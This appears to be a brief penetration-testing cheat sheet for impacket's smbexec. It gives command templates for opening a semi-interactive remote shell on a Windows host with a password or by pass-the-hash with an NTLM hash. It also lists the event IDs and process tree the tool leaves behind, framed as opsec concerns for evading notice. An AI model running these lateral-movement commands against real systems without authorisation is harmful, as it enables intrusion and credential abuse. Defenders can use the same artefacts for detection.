### source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py  

### get semi interactive powershell
```
impacket-smbexec <domain>/<user>:<password>@<rhost>
```

### using hash
```
impacket-smbexec -hashes :<ntlmHash> <domain>/<user>@<rhost>
```
 
### opsec considerations
```
Windows Security Log Event IDs
-Logon (4624)
-Special Logon (4672)

Windows System Logs
-Service Control Manager (7045)
```

### running processes
```
cmd.exe
└── cmd.exe
    └── Conhost.exe
```
